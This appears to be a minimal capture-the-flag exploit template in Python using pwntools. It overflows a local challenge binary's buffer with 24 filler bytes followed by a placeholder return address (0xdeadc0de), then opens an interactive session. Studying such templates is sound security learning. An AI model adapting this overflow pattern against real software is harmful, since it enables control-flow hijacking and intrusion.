#!/usr/bin/env python3

# Title:        XXX.py
# Description:  X
# Author:       bluecosmo

from pwn import *

# Set up pwntools
elf = context.binary = ELF("./chall")
p = process(elf.path)

# Craft our payload
payload = b"A" * 24
payload += p64(0xdeadc0de)

# Send payload into process
p.sendline(payload)
p.interactive()
